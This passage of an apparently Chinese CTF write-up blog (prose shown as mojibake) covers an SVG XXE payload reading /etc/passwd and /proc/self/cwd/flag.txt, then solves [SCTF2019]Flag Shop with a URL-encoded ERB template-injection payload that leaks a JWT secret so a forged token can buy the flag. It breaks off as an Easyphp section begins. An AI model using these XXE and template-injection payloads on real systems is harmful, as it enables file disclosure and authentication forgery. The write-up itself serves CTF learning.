class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/svgmagic4.png" alt="svgmagic4"></p><p>èƒ½è¯»ï¼Œç¡®å®šå­˜åœ¨<code>xxe</code>ï¼Œä½†è¯»<code>/flag</code>æ²¡ååº”ã€‚ã€‚çœ‹äº†<code>wp</code>æ‰çŸ¥é“å¯ä»¥ç”¨è¿™ç§æ–¹æ³•è¯»ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag.txt<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/pwd/</span>ä»£è¡¨å½“å‰è·¯å¾„<br></code></pre></td></tr></table></figure><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="/img/2019flagshop1.png" alt="2019flagshop1"></p><p>å•†åº—ç±»å‹é¢˜ç›®ï¼Œ<code>JinKela</code>åˆ°è¾¾æŒ‡å®šä»·æ ¼åæ‰èƒ½è´­ä¹°<code>flag</code>ï¼Œ<code>work</code>æŒ‰é’®èƒ½èµš<code>JinKela</code>ï¼Œä¸è¿‡ä¸€æ¬¡åªèƒ½èµšä¸ªä½æ•°ã€‚æŠ“åŒ…çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/2019flagshaop2.png" alt="2019flagshaop2"></p><p>è¿™ä¸ª<code>cookie</code>æˆ‘ç”¨<code>base64</code>è§£ç ä¹‹åå‘ç°æ˜¯<code>JWT</code>çš„æ ¼å¼ï¼Œä¸¢<a href="https://jwt.io/">ç½‘ç«™</a>é‡Œé¢åˆ†æä¸€ä¸‹ï¼š</p><p><img src="/img/2019flagshop3.png" alt="2019flagshop3"></p><p><code>jkl</code>è¿™ä¸œè¥¿å°±æ˜¯<code>JinKela</code>ï¼Œä½†ä¸çŸ¥é“<code>secret</code>æ²¡æ³•å¼„ã€‚æ„Ÿè§‰ç¡®å®è¦é è¿™ä¸ªè§£é¢˜ï¼Œä¸è¿‡è¦æƒ³åŠæ³•æ‹¿è¿™ä¸ª<code>secret</code>ã€‚</p><p><code>robots.txt</code>æç¤º<code>/filebak</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>å”‰ï¼Œæˆ‘éƒ½ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆè¯­è¨€å†™çš„ã€‚çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„é¢˜è§£æ‰çŸ¥é“è¿™ä¸œè¥¿å«<code>ruby</code>ã€‚</p><p>é¦–å…ˆå…³æ³¨å’Œ<code>JWT</code>ç”Ÿæˆæœ‰å…³çš„è·¯ç”±ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid, <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span> &#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload, <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>], <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>], <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>], <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123; <span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>], <span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &#125;)<br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure><p><code>auth</code>è¿™ä¸ªè·¯ç”±ä½¿ç”¨<code>ENV[&quot;SECRET&quot;]</code>å¯¹å­˜æœ‰<code>uuid</code>å’Œ<code>jkl</code>çš„å“ˆå¸Œè¡¨è¿›è¡ŒJWTç¼–ç ï¼Œç¼–ç å®Œäº†èµ‹å€¼ç»™<code>cookie</code>ä¸­çš„<code>auth</code>å­—æ®µã€‚<code>info</code>è¿™ä¸ªè·¯ç”±å°±æ˜¯å¯¹<code>auth</code>å­—æ®µè¿›è¡Œè§£ç ã€‚ç›®æ ‡æ˜¯è·å¾—è¿™ä¸ª<code>ENV[&quot;SECRET&quot;]</code>ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢é‚£éƒ¨åˆ†å°±æ˜¯éªŒè¯<code>SECRET</code>å’Œç¯å¢ƒå˜é‡<code>SECRET</code>æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰å°±æŠŠç¯å¢ƒå˜é‡<code>FLAG</code>çš„å€¼ç»™è¾“å‡ºã€‚æ¥ä¸‹æ¥ä¼šæ£€æŸ¥å‚æ•°<code>do</code>å’Œ<code>name[0ï¼Œ7] si working</code>æ˜¯å¦åŒ¹é…(nameçš„å‰ä¸ƒä¸ªå­—ç¬¦)ã€‚åŒ¹é…çš„è¯ä¼šè¾“å‡º<code>&#123;params[:name][0,7]&#125; working successfully!</code></p><p>å‚è€ƒï¼š<a href="https://www.sys71m.top/2018/08/03/Ruby_ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E6%A8%A1%E6%9D%BF%E6%A0%BC%E5%BC%8F">ERBæ¨¡æ¿æ³¨å…¥</a></p><p>ä¸è¿‡æ–‡ç« é‡Œç”¨çš„<code>&lt;%= payload %&gt;</code>è¿™ç§æ ¼å¼ã€‚ã€‚åªæˆªå–ä¸ƒä¸ªå­—ç¬¦å¥½åƒä¸å¤Ÿç”¨ã€‚ã€‚è¿™é‡Œè¦ç”¨åˆ°<code>é¢„å®šä¹‰å˜é‡$&#39;</code>ï¼šè¿™ä¸œè¥¿è¡¨ç¤ºæœ€åä¸€æ¬¡åŒ¹é…æˆåŠŸçš„å­—ç¬¦ä¸²åé¢çš„å­—ç¬¦ä¸²</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">str = <span class="hljs-string">&quot;Hello, Ruby!&quot;</span><br><span class="hljs-keyword">if</span> str =~ <span class="hljs-regexp">/Ruby/</span><br>  puts <span class="hljs-string">&quot;åŒ¹é…æˆåŠŸ&quot;</span><br>  puts <span class="hljs-string">&quot;åŒ¹é…æˆåŠŸåçš„å­—ç¬¦ä¸²: <span class="hljs-subst">#&#123;<span class="hljs-variable">$&#x27;</span>&#125;</span>&quot;</span><br><span class="hljs-keyword">else</span><br>  puts <span class="hljs-string">&quot;åŒ¹é…å¤±è´¥&quot;</span><br><span class="hljs-keyword">end</span><br>ç»“æœï¼š<br>åŒ¹é…æˆåŠŸ<br>åŒ¹é…æˆåŠŸåçš„å­—ç¬¦ä¸²: !<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è¿™éƒ¨åˆ†ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥ä»¤<code>secret</code>ä¸ºç©º(è¿™é‡ŒåŒ¹é…çš„æ—¶å€™å•¥ä¹Ÿæ²¡åŒ¹é…åˆ°)ï¼Œæ­¤æ—¶<code>$&#39;</code>è¿™ä¸œè¥¿å°±ç›´æ¥ä»£è¡¨äº†<code>secret</code>çš„å€¼~</p><p>æ‰€ä»¥ä¼ å‚ï¼š<code>/work?name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working&amp;SECRET=</code>ï¼Œæ³¨æ„è¿™é‡Œ<code>URL</code>ç¼–ç ä¸€ä¸‹ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/work?name<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e&amp;do<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>working&amp;SECRET<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°<code>secret</code>:</p><p><img src="/img/flagshopwhatcookie1.png" alt="flagshopwhatcookie1"></p><p><code>c83b042eef124e41620715001e18a0a18bbb1d2ff64511500c41c473dee525d6c3ba5df2d36116bf8869341e41094a2c4e4c350bb3af31d1c337d6089cbdefd6</code></p><p>ç„¶ååœ¨ä¸Šé¢å“ªä¸ªç½‘ç«™åŠ å¯†å°±è¡Œï¼Œæ³¨æ„æŠŠ<code>jkl</code>å­—æ®µçš„å€¼è®¾ç½®æˆå¤§ç‚¹çš„(æ¯”å¦‚1e+27è¿™ç§)ï¼Œ</p><p><img src="/img/flagshopwhat2.png" alt="flagshopwhat2"></p><p>ç„¶åæ³¨æ„è¿™æ®µä»£ç ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</code>ï¼šåœ¨ <code>auth</code> å˜é‡ä¸­è¿½åŠ ä¸€ä¸ªåŒ…å«ç¯å¢ƒå˜é‡ <code>&quot;FLAG&quot;</code> çš„å“ˆå¸Œè¡¨ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†å°†ä¸€äº›æ ‡å¿—æˆ–æ•æ„Ÿä¿¡æ¯æ·»åŠ åˆ°è®¤è¯ä¸­ã€‚</p><p>æŠŠè¿™æ—¶çš„<code>auth</code>å­—æ®µå†è§£ä¸€ä¸‹ï¼š</p><p><img src="/img/flagshopwhat3.png" alt="flagshopwhat3"></p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>å”‰ï¼Œååºåˆ—åŒ–</p><p><img src="/img/gshenmectfezphp1.png" alt="gshenmectfezphp1"></p><p><code>www.zip</code>æ³„éœ²ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 